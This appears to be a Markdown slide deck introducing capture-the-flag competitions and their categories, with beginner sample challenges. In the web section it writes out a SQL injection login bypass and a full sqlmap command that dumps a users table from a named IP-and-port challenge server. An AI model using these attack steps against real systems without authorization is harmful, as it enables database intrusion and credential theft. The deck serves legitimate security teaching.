# Intro to CTFs

#### + other things you should know

---

## CTF

- Capture The Flag
- Special kind of information security
- You will apply your cybersecurity skills to solve a challenge and get the flag.

--

### Flag

- A secret string
- Can be found only when you successfully solve the challenge
- Thus, submitted as a proof of completion
- Usually of a format like `Curiosity{.*}`
  - `Curiosity{f0und_7h3_fl4g}`

--

### ctftime.org

- Use [ctftime.org](https://ctftime.org) to track CTFs and your teamâ€™s performance
- CTF calendar
- World-wide and country-wide team ratings
- Writeups

---

## Variants

- Jeopardy
- Attack-Defence
- KOTH
- Hardware

--

### Jeopardy

- Challenges from various categories
- Most famous
- Find the flag and submit it for points
- Dynamic scoring
  - -> more solves, less points
- Extra points for the first solve - `First Blood`

--

### Attack-Defence

- Each team will be given a vulnerable service
- Teams will defend their own service and patch it up
- Simultaneously, attack the other teams' services and develop exploits
- DEFCON and NYU-CSAW Finals

--

### KOTH

- King Of The Hill
- Asbolute chaos and fun
- Multiple teams
- Single target network consisting of many inter-connected systems
- Repeatedly pivot and gain access to systems
- Defend them from other teams
- TryHackMe and HackTheBox

--

### Hardware

- Black box testing
- Break built-in security measures
- Example: side-channel attacks

---

## Categories

- Cryptography
- Web Exploitation
- Reverse Engineering
  - Binary Exploitation
- Forensics
  - Steganography
- OSINT
- Programming

---

### Cryptography

- Cryptic message with a hint in the challenge description or title
- Deeper concepts require a good knowledge of mathematics
- Rotation ciphers are a starting point

--

### ROTN

- Encryption by shifting each character by N places to the right
- Most popular - **ROT13** aka Caesar Cipher

$$E_n(x) = (x+n) mod 26$$

$$E_n^\prime(x) = D_n(x) = (x-n) mod 26$$

--

--

### Challenge #1

**Encrypted message:**

`Phevbfvgl{ebg13_penpx3q_fhpp3ffsh11l}`

**Encryption Method:**

`ROT13`

Decrypt the message

--

### Solution

https://cryptii.com/pipes/rot13-decoder

![valid example](assets/intro-to-ctfs/crypto/1.png)

--

### Challenge #2

**Encrypted message:**

`Q3VyaW9zaXR5e3RoMXNfNF9iYXNlNjRfc3RyMW5nfQ==`

**Encryption Method:**

`NOT PROVIDED :))))))) YOUR ON YOUR OWN FOR THIS ONE ....`

Decrypt the message

--

### Solution

- step 1 : Identifier the cipher (cipher = encryption algorithm).

https://www.dcode.fr/cipher-identifier

![valid example](assets/intro-to-ctfs/crypto/2.png)

--

- step 2 : decrypt the ciphertext to get the flag.

https://gchq.github.io/CyberChef/

![valid example](assets/intro-to-ctfs/crypto/3.png)

---

### Web Exploitation

- Deals with web applications
- Identify flaws in the working of the web app
  - how it processes user input
  - programming flaw
- Knowledge of web development will be helpful
  - at least, you require the ability to read and understand JS and PHP code
- [OWASP Top10](https://owasp.org/www-project-top-ten/)

--

### Challenge #1

- We have a login/register website.
- The flag is in the database of the website.

--

- http://51.77.151.20:2789/

![valid example](assets/intro-to-ctfs/web/2.png)

--

- Backend query.

```SQL
SELECT username FROM users WHERE username = '${username}' AND password = '${password}'
```

--

- Normal behaviour :

```SQL
SELECT username FROM users WHERE username = 'mohamed' AND password = 'mohamed2025'
```

![valid example](assets/intro-to-ctfs/web/1.png)

--

- Malicious input :

```SQL
SELECT username FROM users WHERE username = '' OR 1=1 --' AND password = 'alsdkhflkajshdflkjahdsf'
```

![valid example](assets/intro-to-ctfs/web/3.png)

--

- We logged in :))))))))))

![valid example](assets/intro-to-ctfs/web/4.png)

--

- Now after confirming that the website is vulnerable we will go-on for advanced sql-injection vulnerability exploitation
  using `sqlmap`.

--

- We will use the following sqlmap command to attack the website.

```bash
sqlmap --flush-session -u "http://51.77.151.20:2789/login" --data="username=alice&password=wonderland" -T users --dump --batch --threads 10
```

![valid example](assets/intro-to-ctfs/web/5.png)

--

- And we got our flag :))))))

![valid example](assets/intro-to-ctfs/web/6.png)

---

### Reverse Engineering

- In simple terms Reverse Engineering refers to the process of deconstructing any engineered object to figure out the internal mechanisms.

- Reverse Engineering in a CTF is typically the process of taking a compiled program ( like apk, exe, elf ) and converting it back into a more human readable format.

- The goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues.

---

### Forensics

- Forensics is the art of recovering the digital trail left on a computer. There are plently of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded.

- In a CTF context, "Forensics" challenges can include file format analysis, steganography, memory dump analysis, or network packet capture analysis.

--

- Any challenge to examine and process a hidden piece of information out of static data files (as opposed to executable programs or remote servers) could be considered a Forensics challenge

--

### Example

We are given an image, and it might contain certain hidden information

<img src = "assets/intro-to-ctfs/forensics/dog.jpg" width = "300">

--

We start by examining the file type and other metadata of the image using the tool `exiftool`

![assets/intro-to-ctfs/forensics/exiftool.png](assets/intro-to-ctfs/forensics/exiftool.png)

`exiftool` didn't tell us anything usefull except that it is infact a `jpeg` image

--

Now we will use `binwalk` tool to examine if there is some compressed data inside the image

![assets/intro-to-ctfs/forensics/binwalk.png](assets/intro-to-ctfs/forensics/binwalk.png)

looks like there is a `hidden_text.txt` file compressed in the image. We can extract it using `binwalk -e` command.

--

![assets/intro-to-ctfs/forensics/extract.png](assets/intro-to-ctfs/forensics/extract.png)

Finally we've got the "flag".

---

### OSINT

- Open Source INTelligence
  - Anything that is available to everybody in the internet
- If you know how to search smartly, the challenge is already over
- Google Dorks is your excalibur

--

### Challenge #5

- Find my roll number

--

### Solution

**Google query**:

```
<name> <roll_num_format> site:<college website>
```

---

### Programming

- Programming challenge
- Usually automation related or simple problem-solving
- **Python** is a high-level general purpose programming language
  - Huge library and community
  - Easy to learn and v useful
- Used in all places, right from RE to WE

--

### Challenge #6

- You are given a large chunk of text worth easily over 100MB

```text
akOjas;kdfjFs;kdfjasFkfja;kfajf;kIjfdkjCfkafEk
weruqwIeuqworieuSwoeruqperuqpweruqTeriuqwpHerw
zmnEcv,mncv,mznvzvnzvBvnzvnzmvnzmcvnzExvbzcvbs
qwemSnq,embrtjThvovchzoivucTaanfamfdnqVewnrucp
ewnSqmnrzhvcHicvuapiuasdfna.OenrqwmenrjhWziocu
```

--

## HINT

- Anything odd?

```text
akOjas;kdfjFs;kdfjasFkfja;kfajf;kIjfdkjCfkafEk
weruqwIeuqworieuSwoeruqperuqpweruqTeriuqwpHerw
zmnEcv,mncv,mznvzvnzvBvnzvnzmvnzmcvnzExvbzcvbs
qwemSnq,embrtjThvovchzoivucTaanfamfdnqVewnrucp
ewnSqmnrzhvcHicvuapiuasdfna.OenrqwmenrjhWziocu
```

--

### Solution

- Notice that the capital letters form something meaningful
- \*insert some ezpz programming with ASCII values\*
- Extracted capital letter form this:

```text
OFFICEISTHEBESTTVSHOW
```

---

### Pentesting

- Penetration testing
- "Penetrate" the security measures and gain access to the system
- Multiple ways to exploit a single system
- Usually involves one or more of the above categories
- Simulates real world scenarios

---

## Practice sites

- [TryHackMe](https://tryhackme.com)
- [VulnHub](https://www.vulnhub.com/)
- [HackTheBox](https://hackthebox.eu)

(in that order)

---

**Don't be a script kiddie**

![script kiddie](assets/intro-to-ctfs/script_kiddie.png)

---

## Writeups and reports

- Make sure to record your approaches
- Will definitely benefit you in long pentests and challenges where you will have to connect multiple services and systems to exploit the system
- Helpful to others too
